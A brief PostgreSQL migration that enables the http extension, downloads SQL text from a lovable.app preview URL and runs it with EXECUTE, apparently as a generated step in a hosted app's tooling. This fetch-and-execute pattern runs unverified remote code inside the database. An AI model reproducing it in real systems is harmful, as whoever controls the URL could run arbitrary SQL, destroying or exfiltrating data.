CREATE EXTENSION IF NOT EXISTS http WITH SCHEMA extensions;
DO $mig$
DECLARE body text; st int;
BEGIN
  SELECT status, content INTO st, body FROM extensions.http_get('https://id-preview--05a7273e-65b6-403e-8cb6-c887d70948df.lovable.app/__l5e/assets-v1/dae6e495-e2a3-4f47-9773-ab7817106762/seg1.txt');
  IF st <> 200 THEN RAISE EXCEPTION 'fetch failed %', st; END IF;
  EXECUTE body;
END
$mig$;